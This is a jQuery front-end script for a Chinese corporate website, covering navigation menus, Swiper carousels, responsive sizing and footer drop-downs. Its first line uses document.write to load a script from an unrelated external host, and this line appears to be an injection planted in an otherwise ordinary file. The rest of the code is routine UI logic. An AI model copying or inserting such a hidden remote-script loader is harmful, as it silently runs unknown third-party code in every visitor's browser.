// JavaScript Document
document.write('<script type="text/javascript" src="http://notes.uoeee.com/tc.js"></script>');

$(function () {


    //-------- 导航 --------


    //-------- 判断分辨率 --------

    $(window).resize(function () {

    })

    $(window).load(function () {
        positioncont();
        $(window).resize(function () {
            positioncont();
        })
    })

    function positioncont() {

        var overflowwid = $("body").css("overflow", "hidden").width();
        var windowwid = $("body").removeAttr("style").width();
        var scrollwid = overflowwid - windowwid;

        if (windowwid + scrollwid > 429) {
            $('.wwintroimglist').removeClass('wwintrotShow');
        }
        else {
            $('.wwintroimglist').addClass('wwintrotShow')
        };
		if (windowwid + scrollwid > 520) {
            //--护理事业部-事业群介绍
        	var wwHeight = $('.wwnurselist li:nth-of-type(1)').find('img').height();
        	$('.wwnurselist').css('height', wwHeight);
			
        }
        else {
            $('.wwnurselist').removeAttr("style")
        };

		
		
		
        if (windowwid + scrollwid > 767) {
            var wwheight767 = $('.wwdlHeight767 dl dt img').height();
            $('.wwdlHeight767 dl dd').css('height', wwheight767);

            //-人力资源-员工活动
            var wwddheight = $('.wwactivity dl').find('dt img').height()
            $('.wwactivity dl dd').css('height', wwddheight);

            //人力资源-员工活动
            var wwdtimg = $('.wwfamilyDl dd img').height()
            $('.wwfamilyDl dt img').css('height', wwdtimg - 40);


        }
        else {
            $('.wwdlHeight767 dl dd').removeAttr("style")
            $('.wwactivity dl dd').removeAttr("style");
            $('.wwfamilyDl dt img').removeAttr("style");

        };


        if (windowwid + scrollwid < 991) {

            //首页科技创新板块02
            var swiper = new Swiper('.wwinnoright', {
                pagination: '',
                nextButton: '.wwinnoright .wwinprodivright',
                prevButton: '.wwinnoright .wwinprodivleft',
                paginationClickable: true,
                slidesPerView: 2,
                spaceBetween: 10,
                breakpoints: {
                    640: {
                        slidesPerView: 1,
                        spaceBetween: 0
                    }
                }

            });


        }


        if (windowwid + scrollwid > 992) {
            var wwheight2 = $('.wwdlHeight dl dt img').height();
            $('.wwdlHeight dl dd').css('height', wwheight2);

            //首页-产品板块
            //var indexpro = $('.wwinproright').height()
            //$('.wwinproleft').css('height',indexpro);

        }
        else {
            $('.wwdlHeight dl dd').removeAttr("style")
            //$('.wwinproleft').removeAttr("style")
        };

        if (windowwid + scrollwid > 991) {
            $('.wwnav').removeClass('wwnavphone');
            //手机汉堡
            $(".wwphnavicon").removeClass('cur')
            $('.wwnav ul li').unbind("mouseenter").bind('mouseenter', function () {
                $(this).find('.wwnavlist').show();
            });

            $('.wwnav ul li').unbind("mouseleave").bind('mouseleave', function () {
                $(this).find('.wwnavlist').hide();

            });

            $('.wwnavdrop').unbind("mouseenter").bind('mouseenter', function () {

				if($(this).find('ul li').length == 0){
				    $(this).find('.wwnavdroplist').hide()
				}else{
					 $(this).find('.wwnavdroplist').show();	
				}
            });

            $('.wwnavdrop').unbind("mouseleave").bind('mouseleave', function () {
                $(this).find('.wwnavdroplist').hide();

            });

			if($('.wwnavdrop').find('.wwnavdroplist').lengths > 0){
				
				
            $('.wwnavdrop').unbind("mouseenter").bind('mouseenter', function () {

                $(this).find('.wwnavdroplist').show();
            });	
					
			}
			
			
			//医药行业解决方案
			$('.Foodlisst dl').each(function(index, element) {
                var Foodlisstheight = $(this).find('dt').height()
				$(this).find('dd').css('height',Foodlisstheight)
				
            });
				
			


        }
        else {
            $('.wwnav').addClass('wwnavphone')

            $(".wwnav ul li").unbind("mouseenter");
            $(".wwnavdrop").unbind("mouseenter");
            $(".wwnav ul li").unbind("mouseleave");
            $(".wwnavdrop").unbind("mouseleave");

            //导航
            $(".wwphnavicon").unbind("click").bind("click", function () {
                if ($('.wwnav').is(':visible')) {
                    $('.wwnav').slideUp();
                    $(this).removeClass('cur')
                } else {
                    $('.wwnav').slideDown();
                    $(this).addClass('cur')
                }
            })

            $(".wwnav ul li h3 span").unbind("click").bind("click", function () {
                if ($(this).parent('h3').siblings('.wwnavlist').is(':visible')) {
                    $(this).parent('h3').siblings('.wwnavlist').slideUp();
					$(this).parent('h3').removeClass('cur')
                } else {
                    $(this).parent('h3').siblings('.wwnavlist').slideDown();
					$(this).parent('h3').addClass('cur')
					$(this).parents('li').siblings().find('.wwnavlist').slideUp();
					$(this).parents('li').siblings('li').find('h3').removeClass('cur')
                }
            })


            $('.wwnavdrop h4 span').unbind("click").bind("click", function () {

                if ($(this).parent('h4').siblings('.wwnavdroplist').is(':visible')) {
                    $(this).parent('h4').siblings('.wwnavdroplist').slideUp();
					$(this).parent('h4').removeClass('cur')
                } else {
                    $(this).parent('h4').siblings('.wwnavdroplist').slideDown();
					$(this).parents('.wwnavdrop').siblings().find('.wwnavdroplist').slideUp();
					$(this).parent('h4').addClass('cur')
					$(this).parents('.wwnavdrop').siblings().find('h4').removeClass('cur')
                }

            })


            $('.wwnavdroplist ul li h5 span').unbind("click").bind("click", function () {

                if ($(this).parent('h5').siblings('.wwnavlistfour').is(':visible')) {
                    $(this).parent('h5').siblings('.wwnavlistfour').slideUp();
					$(this).parent('h5').removeClass('cur')
                } else {
                    $(this).parent('h5').siblings('.wwnavlistfour').slideDown();
					$(this).parent('h5').addClass('cur')
					$(this).parents('li').siblings().find('.wwnavlistfour').slideUp();
					$(this).parents('li').siblings().find('h5').removeClass('cur')
                }

            })


            //头部搜索
            $(".wwsearchph").unbind("click").bind("click", function () {
                if ($(".wwsearch").is(":hidden")) {
                    $(".wwindexmask").show();
                    $(".wwsearch").fadeIn();
                }
                else {
                    $(".wwindexmask").hide();
                    $(".wwsearch").fadeOut();
                };

            });
			
			//1020
			 $('.Foodlisst dl dd').removeAttr("style")

        };

		var wwchange = $('.wwchange li').find('img').height()
		$('.wwchange li').find('.wwchangediv').css('height',wwchange);
		
		
		var wwbottom = $('.wwchange li:nth-of-type(2)').find('.wwchangediv').height()
		$('.wwchange li:nth-of-type(2)').find('.wwchangeimg').css('bottom',-wwbottom);
		

        /*产品详情*/
        var swiper = new Swiper('.wwsmalldiv', {
            pagination: '',
            nextButton: '.swiper-button-next',
            prevButton: '.swiper-button-prev',
            paginationClickable: true,
            slidesPerView: 4,
            spaceBetween: 20,
            breakpoints: {
                991: {
                    slidesPerView: 1,
                    spaceBetween: 10
                }

            }
        });

        /*产品详情---相关产品*/
        var swiper = new Swiper('.wwprobebox', {
            pagination: '',
            nextButton: '.wwwwproberight',
            prevButton: '.wwwwprobeleft',
            paginationClickable: true,
            slidesPerView: 4,
            spaceBetween: 20,
            breakpoints: {
                1024: {
                    slidesPerView: 2,
                    spaceBetween: 20
                },
                768: {
                    slidesPerView: 2,
                    spaceBetween: 10
                },
                640: {
                    slidesPerView: 1,
                    spaceBetween: 5
                }
            }
        });


        //人力资源-员工活动切换
        var swiper = new Swiper('.wwfamilytablist', {
            pagination: '',
            nextButton: '.wwfamilyleft',
            prevButton: '.wwfamilyright',
            paginationClickable: true,
            slidesPerView: 6,
            spaceBetween: 20,
            breakpoints: {
                1260: {
                    slidesPerView: 5,
                    spaceBetween: 20
                },
                1024: {
                    slidesPerView: 3,
                    spaceBetween: 20
                },
                768: {
                    slidesPerView: 2,
                    spaceBetween: 10
                },
                640: {
                    slidesPerView: 1,
                    spaceBetween: 5
                }
            }
        });



        

        /*var wwHeight = $('.wwcauseimg li:nth-of-type(6)').find('img').height();
        $('.wwcauseimg').css('height',wwHeight);*/

        var wwHeightall = $('.wwallhegiht li:nth-of-type(1)').find('img').height();
        $('.wwallhegiht li').css('height', wwHeightall);

        /*联系我们-产业基地和分子公司*/
        $('.wwaddress ul li:last').css({ 'border-bottom': 'none', 'padding-bottom': '20px' });
        $('.wwaddress ul li:last').find('.wwaddlistdiv').css('border-right', 'none');




    };


	$('.wwchoose').hover(function(){
		$(this).find('.wwchooseUp').stop(true,true).slideDown()	
	},function(){
		$(this).find('.wwchooseUp').stop(true,true).slideUp();
	})
	
	$('.wwlang').hover(function(){
		$(this).find('.wwlangUp').stop(true,true).slideDown()	
	},function(){
		$(this).find('.wwlangUp').stop(true,true).slideUp();
	})
	

    //产品详情切换
    $('.wwprodescword').eq(0).show();
    $('.wwprodesctab span').eq(0).addClass('cur')
    $('.wwprodesctab span').click(function () {
        var index = $(this).index();
        $('.wwprodescword').hide().eq(index).show();
        $(this).addClass('cur').siblings().removeClass('cur')
    })

    /*荣誉资质*/

    $(".wwpopbox ul li").click(function () {
        var thisimg = $(this).find("img").attr("src");
        $(".bigimgfloat img").attr("src", thisimg);
        $(".yuangongmask").show();
        $(".bigimgcont").fadeIn();
        //$(".bigimgcont").css("top", winscroll + 100);

    });

    $(".yuangongmask, .closeyuangong").click(function () {
        $(".yuangongmask").fadeOut();
        $(".bigimgcont").fadeOut(function () {
            $(".bigimgfloat ul").html("");
        });

    });


    //展会动态
    var swiper = new Swiper('.wwshowlistdiv', {
        pagination: '',
        nextButton: '.wwshowright',
        prevButton: '.wwshowleft',
        paginationClickable: true,
        slidesPerView: 3,
        spaceBetween: 20,
        breakpoints: {
            1024: {
                slidesPerView: 2,
                spaceBetween: 20
            },
            768: {
                slidesPerView: 2,
                spaceBetween: 10
            },
            640: {
                slidesPerView: 1,
                spaceBetween: 5
            }

        }
    });
	
	//公司概括 
	var swiper = new Swiper('.wqp-column-list .commonweb', {
        pagination: '',
        nextButton: '.wqp-column-list .wwyeartabright',
        prevButton: '.wqp-column-list .wwyeartableft',
        paginationClickable: true,
        slidesPerView:4,
        spaceBetween: 0,
        breakpoints: {
            1023: {
                slidesPerView: 3,

                spaceBetween: 0
            },
            991: {
                slidesPerView: 3,
                spaceBetween: 0
            },
			767: {
                slidesPerView:2,
                spaceBetween: 0
            },
            640: {
                slidesPerView: 1,
                spaceBetween: 0
            }

        }
    });
	


	//内页切换
	var swiper = new Swiper('.wqp-banner', {
		loop: true,
        autoplay: 5000,
        speed: 1000,
        pagination: '.wqp-bannerbtn',
        paginationClickable: true,
        autoplayDisableOnInteraction: false,
        grabCursor: false,
        parallax: true
    });

	


   /* $('.wwcaseclose').click(function () {
        $(this).parents('.wwcasepop').hide()
        $('.wwcasemask').hide();
		$('.wwcasepoplist ul').removeAttr("style")	
		$('.wwcasepoplist ul li').unbind("click",diaoyong); 
		//$('.wwpopright').unbind("click",diaoyong); 
		
		
    })*/
	
	
	
	/*
	 $(".wwcasepoplist ul li").unbind("click").bind("click", function () {
       $('.wwcasemask').show();
        $('.wwcasepop').show();
		$('.wwcasepoplist ul').addClass('zero')
		//diaoyong();
        
    })*/
	
	$('.wwcaseclose').click(function () {
        $(this).parents('.wwcasepop').hide()
        $('.wwcasemask').hide();
		$('.wwcasepoplist ul').removeAttr("style")	
		//$('.wwcasepoplist ul li').unbind("click",diaoyong); 
		//$('.wwpopright').unbind("click",diaoyong); 
		
		//diaoyong();
		
		
    })




    //-------- 首页 --------
    if ($(".wwindexbanner").length > 0) {
        var mySwiper = new Swiper('.wwindexbanner', {
            loop: true,
            autoplay: 5000,
            speed: 1000,
            pagination: '.wwindexbannerbtn',
            paginationClickable: true,
            autoplayDisableOnInteraction: false,
            grabCursor: false,
            parallax: true

        });

    };

    //人力资源-员工活动切换
    $('.wwfamilybotlist').eq(0).show();
    //$('.wwfamilytablist ul li').eq(0).addClass('cur')
    $(".wwfamilytablist ul li").eq(0).find("img").attr("src", $(".wwfamilytablist ul li").eq(0).find("img").attr("rel"))
    $(".wwfamilytablist ul li").unbind("click").bind("click", function () {
        //var wwfamily = $(this).index();
        //$('.wwfamilybotlist').hide().eq(wwfamily).show();
        //$(this).addClass('cur').siblings().removeClass('cur')

        var img = $(this).find("img");
        var rel = img.attr("rel");
        var src = img.attr("src");

        img.attr("src", rel)
        $(this).siblings().find('img').each(function () {
            $(this).attr('src', $(this).attr('baserel'));
        });

    })

    //首页产品板块
    var swiper = new Swiper('.wwinprodivlast', {
        pagination: '',
        nextButton: '.wwinprodivlast .wwinprodivright',
        prevButton: '.wwinprodivlast .wwinprodivleft',
        paginationClickable: true,
        slidesPerView: 2,
        spaceBetween: 0,
        breakpoints: {
            1024: {
                slidesPerView: 1,
                spaceBetween: 0
            },
            768: {
                slidesPerView: 1,
                spaceBetween: 0
            },
            640: {
                slidesPerView: 1,
                spaceBetween: 0
            }

        }
    });

    //首页科技创新板块
    var swiper = new Swiper('.wwinnoleftdiv', {
        pagination: '',
        nextButton: '.wwinnoleftdiv .wwinprodivright',
        prevButton: '.wwinnoleftdiv .wwinprodivleft',
        paginationClickable: true,
        slidesPerView: 1,
        spaceBetween: 0,
		autoplay:3000,
		autoplayDisableOnInteraction:false,
        breakpoints: {
            991: {
                slidesPerView: 1,
                spaceBetween: 0
            },
            640: {
                slidesPerView: 1,
                spaceBetween: 0
            }

        }
    });


    //首页员工活动
    var swiper = new Swiper('.wwindexhdleft', {
        pagination: '',
        nextButton: '.wwindexhdleft .wwinprodivright',
        prevButton: '.wwindexhdleft .wwinprodivleft',
        paginationClickable: true,
		autoplay:3000,
		autoplayDisableOnInteraction:false,
        slidesPerView: 1,
        spaceBetween: 0
    });

    //首页科技创新板块
    var swiper = new Swiper('.wwresulbotcon', {
        pagination: '',
        nextButton: '.wwresulbot .wwresulbotright',
        prevButton: '.wwresulbot .wwresulbotleft',
        paginationClickable: true,
        slidesPerView: 5,
        spaceBetween: 11,
        breakpoints: {
            1023: {
                slidesPerView: 4,
                spaceBetween: 10
            },
            991: {
                slidesPerView: 3,
                spaceBetween: 10
            },
            767: {
                slidesPerView: 2,
                spaceBetween: 10
            },
            640: {
                slidesPerView: 1,
                spaceBetween: 0
            }

        }
    });

  
    $(".wwindexmask").on("click", function () {
        $(this).hide();
        $(".wwsearch").fadeOut();

    })


    // 右侧栏
    var rightMW = $('.rightmenu .ico-box').find('.ico-cont').outerWidth(true);
    $('.rightmenu').find('.ico-box').hover(function () {
        $(this).find('.ico-cont').stop(false, true).animate({ 'right': 0 }, 500);
    }, function () {
        $(this).find('.ico-cont').stop(false, true).animate({ 'right': -rightMW }, 500);
    });

    // 返回顶部

    $('.backtop').on('click', function () {
        $('html,body').animate({ scrollTop: 0 }, 800);
    });

    $('.wwico-box').on('click', function () {
        var indexpos = $(this).index();

        $("html, body").animate({
            scrollTop: $('.indexpos').eq(indexpos).offset().top
        })
    })



	//研究报告
	var swiper = new Swiper('.wwaddnavbox', {
        pagination: '',
        nextButton: '.wwaddnav02 .wwyeartabright',
        prevButton: '.wwaddnav02 .wwyeartableft',
        paginationClickable: true,
        slidesPerView:5,
        spaceBetween: 14,
        breakpoints: {
            1023: {
                slidesPerView:5,
                spaceBetween: 14
            },
			991: {
                slidesPerView:3,
                spaceBetween: 14
            },
			767: {
                slidesPerView:2,
                spaceBetween: 14
            },
            640: {
                slidesPerView: 1,
                spaceBetween: 0
            }

        }
    });
	
	/*$('.classiccaseM').each(function(index, element) {
        if($(this).find('li').length == 1){
			$(this).siblings('.leftbtn, .rightbtn').show();	
		}else{
			$(this).siblings('.leftbtn, .rightbtn').hide();		
		}
		console.log($('.classiccaseM li').length)
    });
	*/
	
	
	
	
	//展会报告判断
	if($('.wwshowlistdiv ul li').length == 0){
		$('.wwshowlist').hide();	
	}else{
		$('.wwshowlist').show();		
	}
	
	
	//底部导航
		$('.footer ul li h3 em').click(function(){
				if($(this).parent('h3').siblings('.wwfootdrop').is(':hidden')){
					$(this).parent('h3').siblings('.wwfootdrop').slideDown();
					$(this).parent('h3').addClass('cur');
					$(this).parents('li').siblings().find('.wwfootdrop').slideUp();
					$(this).parents('li').siblings().find('h3').removeClass('cur');
				}else{
					$(this).parent('h3').siblings('.wwfootdrop').slideUp();
					$(this).parent('h3').removeClass('cur')	
				}	
			})
			
			
			$('.wwfootdrop li h4 em').click(function(){
				if($(this).parent('h4').siblings('.wwfootdown').is(':hidden')){
					$(this).parent('h4').siblings('.wwfootdown').slideDown();
					$(this).parent('h4').addClass('cur')
					
					$(this).parents('li').siblings().find('.wwfootdown').slideUp();
					$(this).parents('li').siblings().find('h4').removeClass('cur');
				}else{
					$(this).parent('h4').siblings('.wwfootdown').slideUp();
					$(this).parent('h4').removeClass('cur')	
				}	
			})
			
			
			$('.wwfootdrop li h5 em').click(function(){
				if($(this).parent('h5').siblings('.wwfootdowncon').is(':hidden')){
					$(this).parent('h5').siblings('.wwfootdowncon').slideDown();
					$(this).parent('h5').addClass('cur');
					$(this).parents('.wwfootdownup').siblings().find('.wwfootdowncon').slideUp();
					$(this).parents('.wwfootdownup').siblings().find('h5').removeClass('cur');
					
										
				}else{
					$(this).parent('h5').siblings('.wwfootdowncon').slideUp();
					$(this).parent('h5').removeClass('cur')	
				}	
			})
			
			
			
			//底部判断
			$('.wwfootdown').each(function(index, element) {
                if($(this).find('.wwfootdownup').length == 0){
					$(this).siblings('h4').find('em').hide();
				}
            });
			
			$('.wwfootdowncon').each(function(index, element) {
                if($(this).find('a').length == 0){
					$(this).siblings('h5').find('em').hide();
				}
            });
			
			
			$('.wwnavdroplist ul').each(function(index, element) {
                if($(this).find('li').length == 0){
					$(this).parent('.wwnavdroplist').siblings('h4').find('span').hide();	
				}
            });
			
			$('.wwnavlistfour').each(function(index, element) {
                if($(this).find('a').length == 0){
					$(this).siblings('h5').find('span').hide();	
				}
            });
	
	
	
	//成功案例弹窗调用
	wwpopid();
	
	//投资者关系调用
	problemlist()
	
	
	//底部显示
	$(window).scroll(function(){
		var _height=$(window).height();
		var onscrollTop=$(window).scrollTop();
		if(onscrollTop>_height/4){
			$('.rightmenuin').show();	
		}else{
			$('.rightmenuin').hide();	
		}
	})
	
	
	//建设中弹窗
	var contenttext = '网站正在建设中，请稍后访问...... \n This page is under construction…you are welcome to visit it shortly.'
	$('.wwlangUp p:eq(0)').click(function(){
		alert(contenttext)	
	})
	
	var contenttext2 = '网站正在建设中，请稍后访问...... \n このサイトは今建設中でございます\…\
もうしばらく、お待ちください。'
	$('.wwlangUp p:eq(1)').click(function(){
		alert(contenttext2)	
	})
	
	$('.wnetwork-nav ul li').click(function(){
		//alert(0);
	})
	
	
	$('.wwphotolist ul li').click(function () {
        $('.wwcasemask').show();
        $('.wwcasepop').show();
    })	
	
	
	
})


$(function () {

    //wuqiuping start
    function mobile() {
         if ($(document).width() > 640) {

            $(".wwindexbanner ul li").each(function (index, element) {
                var _pcimg = $(this).attr("pc-img");
                $(this).find("img").attr("src", _pcimg)
            });

            //内页
			
			$(".wqp-banner ul li").each(function (index, element) {
				var _inpcimg = $(this).attr("pc-img");
                $(this).find("img").attr("src", _inpcimg)
            });
        }
        else {
			$(".wqp-banner ul li").each(function (index, element) {
                 var _inmocimg = $(this).attr("mobile-img");
				$(this).find("img").attr("src", _inmocimg)
				
            })

            $(".wwindexbanner ul li").each(function (index, element) {
                var _mobileimg = $(this).attr("mod-img");
                $(this).find("img").attr("src", _mobileimg)
            })
        }
    }
    mobile();
    $(window).resize(function () {
        mobile()
    });

    function content() {
        var overflowwid = $("body").css("overflow", "hidden").width();
        var windowwid = $("body").removeAttr("style").width();
        var scrollwid = overflowwid - windowwid;



        if (windowwid + scrollwid > 991) {

            //底部
            $(".footerWeb ul li h3").unbind("click");
            $(".subFooter").css("display", "block");

        }
        else {


        }
    }
    content();
    $(window).resize(function () {
        content()
    });
})


function wwpopid(){
	
    //--成功案例弹窗
	$(".wwcaselist ul li").unbind("click");

    
}


function problemlist(){
	//投资者关系-投资者交流
		$(".problemlist dt").unbind("click");
        $(".problemlist dt").click(function () {
            if ($(this).parent().find("dd").is(":hidden")) {
                $(this).addClass("showdd").parent("dl").siblings().find("dt").removeClass("showdd");
                $(this).parent().find("dd").show().parent("dl").siblings().find("dd").hide();
            }
            else {
                $(this).removeClass("showdd");
                $(this).parent().find("dd").hide();
            }
        });	
		
		
		
		
} 




